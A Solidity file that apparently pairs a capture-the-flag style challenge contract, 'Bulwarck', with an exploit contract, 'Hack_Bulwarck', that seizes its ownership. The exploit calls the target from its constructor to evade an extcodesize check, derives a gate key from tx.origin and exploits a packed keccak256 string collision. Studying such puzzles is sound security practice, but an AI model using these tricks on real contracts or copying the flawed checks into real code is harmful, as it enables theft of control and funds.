pragma solidity ^0.4.18;

contract Bulwarck{
    uint points;
    address public owner;
    string public x;
    string public y;
    
    function Bulwarck(string _x, string _y)
    {
        owner = msg.sender;
        x = _x;
        y = _y;
    }
    
    function blooper(address addr) private returns(bool)
    {
        uint x;
        assembly { x := extcodesize(caller) }
        return x == 0;
    }
    
    function check(string a, string b) private returns(bool){
        if(keccak256(x)==keccak256(a) || keccak256(y)==keccak256(b)){
            return false;  
       }else{
            if( keccak256(x,y) == keccak256(a,b)){
                return true;
           }else{
            return false;
            }
         }
    }
    
    function jumpOver(bytes8 key, string x, string y)
    {
        require(msg.sender != tx.origin);
        require(blooper(msg.sender));
        require(uint32(key) != uint64(key));
        require(uint32(key) == uint16(tx.origin));
        require(check(x,y));
        
        owner = tx.origin;
    }
}

contract Hack_Bulwarck {
    
    address public target = address;	// Replace it
    bytes8 public _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
    string x="listen to man";
    string y="yspeak to few";
    constructor()
    {
        Bulwarck b = Bulwarck(target);
        b.jumpOver(_gateKey,x,y);
    }
}